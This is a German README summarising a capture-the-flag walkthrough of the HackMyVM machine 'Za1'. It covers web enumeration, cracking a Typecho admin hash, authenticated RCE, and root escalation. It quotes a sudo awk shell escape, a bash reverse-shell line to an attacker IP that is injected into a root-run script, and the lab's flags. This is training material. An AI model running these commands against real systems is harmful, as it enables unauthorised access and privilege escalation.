# Za1 - HackMyVM - Easy

**Schwierigkeitsgrad:** Easy 🟢

---

## ℹ️ Maschineninformationen

*   **Plattform:** HackMyVM
*   **VM Link:** [https://hackmyvm.eu/machines/machine.php?vm=Za1](https://hackmyvm.eu/machines/machine.php?vm=Za1)
*   **Autor:** DarkSpirit

![Za1 Machine Icon](Za1.png)

---

## 🏁 Übersicht

Dieser Bericht dokumentiert den Penetrationstest der virtuellen Maschine "Za1" von HackMyVM. Das Ziel war die Erlangung von Systemzugriff und die Ausweitung der Berechtigungen bis auf Root-Ebene. Die Maschine wies Schwachstellen im Webbereich auf, darunter einen veralteten Apache-Webserver mit Directory Indexing, der zur Offenlegung eines Datenbank-Dumps führte. Dieser Dump enthielt gehashte Passwörter für das Typecho-CMS, von denen eines (für den Benutzer 'admin') geknackt werden konnte. Initialer Zugriff als `www-data` wurde über eine Authenticated Remote Code Execution (RCE) in Typecho 1.2.1 oder einen direkten PHP-Shell-Upload erreicht. Die Privilegien-Eskalationskette führte von der `www-data`-Shell über eine horizontale Eskalation zum Benutzer `za_1` (durch Ausnutzung einer `sudo` NOPASSWD-Fehlkonfiguration für das Binary `awk`) und schließlich zur Erlangung von Root-Rechten durch die Modifikation eines für `za_1` schreibbaren, Root-eigenen Skripts (`.root/back.sh`) im Home-Verzeichnis von `za_1`.

---

## 📖 Zusammenfassung des Walkthroughs

Der Pentest gliederte sich in folgende Hauptphasen:

### 🔎 Reconnaissance

*   Identifizierung der Ziel-IP (192.168.2.53) im lokalen Netzwerk mittels `arp-scan`.
*   Hinzufügen des Hostnamens `za1.hmv` zur lokalen `/etc/hosts`.
*   Umfassender Portscan (`nmap`), der Port 22 (SSH - OpenSSH 7.6p1) und Port 80 (HTTP - Apache httpd 2.4.29) als offen identifizierte und die Webanwendung als "Typecho 1.2.1" erkannte.

### 🌐 Web Enumeration

*   Scan des Apache-Webservers auf Port 80 mit `nikto`, der fehlende Sicherheits-Header, veraltete Apache-Version und kritisches Directory Indexing in `/install/`, `/sql/` und `/var/` identifizierte.
*   Verzeichnis-Brute-Force mit `feroxbuster` und `gobuster` bestätigte Weiterleitungsstrukturen und das Directory Indexing, insbesondere im `/sql/` Verzeichnis.
*   Manuelle Überprüfung von `http://za1.hmv/sql/` enthüllte Dateilisting, welches die SQL-Dateien `new.sql` und `sercet.sql` preisgab.
*   Ein Versuch eines Local File Inclusion (LFI)-Angriffs über `index.php?s=file:///.../etc/passwd` schlug fehl.

### 💻 Initialer Zugriff

*   Herunterladen und Analyse von `new.sql` (aus dem `/sql/` Verzeichnis), welche eine SQLite-Datenbank der Typecho-Installation enthielt.
*   Extraktion von Benutzer-Hashes aus der `typechousers`-Tabelle.
*   Knacken des PHPass-Hashes für den Benutzer `admin` mittels `john the Ripper`, was das Passwort `123456` offenbarte.
*   Erfolgreicher Login als `admin` in das Typecho-Admin-Panel.
*   Ausnutzung einer Authenticated Remote Code Execution (RCE) Schwachstelle in Typecho 1.2.1 über die erneute Ausführung der `install.php` (durch Manipulation der Datenbankkonfiguration) oder alternativer Upload einer PHP-Reverse-Shell über die Admin-Funktion (`write-post.php`).
*   Einrichtung eines Netcat-Listeners auf dem Angreifer-System.
*   Erfolgreiche Etablierung einer Reverse Shell als Benutzer `www-data`.

### 📈 Privilege Escalation

*   Von der `www-data` Shell: System-Enumeration. Prüfung der `sudo` Berechtigungen (`sudo -l`) zeigte eine kritische Fehlkonfiguration: `(za_1) NOPASSWD: /usr/bin/awk`.
*   Ausnutzung der Sudo-Fehlkonfiguration für `awk` (mit NOPASSWD für `za_1`) in Kombination mit der GTFOBins-Methode (`sudo awk 'BEGIN {system("/bin/sh")}'`) zur horizontalen Privilegien-Eskalation auf Benutzer `za_1`.
*   Von der `za_1` Shell: Weitere Enumeration des Home-Verzeichnisses. Das versteckte Verzeichnis `.root/` enthielt das Skript `back.sh`, das Root-Besitz hatte, aber für den Benutzer `za_1` schreibbar (`-rwxrwxrwx`) war.
*   Modifikation des Skripts `back.sh` mit `nano`, um eine Reverse Shell (`bash -i >&/dev/tcp/192.168.2.199/5555 0>&1`) zur Angreifer-Maschine einzufügen.
*   Warten auf die Ausführung des modifizierten Skripts (vermutlich über einen Cronjob oder einen Systemdienst).
*   Erfolgreiche Erlangung einer interaktiven Root-Shell.

### 🚩 Flags

*   **User Flag:** `/home/za_1/user.txt`
    `flag{ThursD0y_v_wo_50}`
*   **Root Flag:** `/root/root.txt`
    `flag{qq_group_169232653}`

---

## 🧠 Wichtige Erkenntnisse

*   **Veraltete Software:** Die Verwendung veralteter Webserver (Apache) und CMS-Software (Typecho) birgt bekannte Schwachstellen, die leicht ausgenutzt werden können.
*   **Fehlkonfigurationen des Webservers (Directory Indexing):** Directory Indexing ist eine schwerwiegende Informationslecks, die Angreifern direkten Zugriff auf Dateistrukturen und sensible Dateien (wie Datenbank-Dumps) ermöglichen.
*   **Schwache Passwortrichtlinien:** Die Verwendung von einfachen und gängigen Passwörtern wie "123456" für Administratorkonten stellt ein enormes Sicherheitsrisiko dar und ermöglicht einen schnellen initialen Zugriff.
*   **Unsichere Installationsskripte (Authenticated RCE):** Installationsskripte, die nach der Bereitstellung der Anwendung weiterhin ausführbar sind oder deren Logik unsichere Operationen zulässt (z.B. Dateischreiben durch Manipulation von Datenbankpfaden), sind ein direkter Weg zu Remote Code Execution für authentifizierte Benutzer.
*   **Sudo Fehlkonfigurationen (GTFOBins):** NOPASSWD-Einträge für Binaries in der `sudoers`-Datei, die zur Shell-Erlangung missbraucht werden können (wie `awk`), sind ein klarer und direkter Weg zur Privilegien-Eskalation.
*   **Schreibbare Root-eigene Skripte:** Skripte, die unter Root-Rechten ausgeführt werden (z.B. durch Cronjobs) aber für niedrigprivilegierte Benutzer schreibbar sind, sind eine extrem gefährliche Schwachstelle und ermöglichen die direkte Erlangung von Root-Rechten.

---

## 📄 Vollständiger Bericht

Eine detaillierte Schritt-für-Schritt-Anleitung, inklusive Befehlsausgaben, Analyse, Bewertung und Empfehlungen für jeden Schritt, finden Sie im vollständigen HTML-Bericht:

[**➡️ Vollständigen Pentest-Bericht hier ansehen**](https://alientec1908.github.io/Za1_HackMyVM_Easy/)

---

*Berichtsdatum: 18. Juni 2025*
*Pentest durchgeführt von Ben*
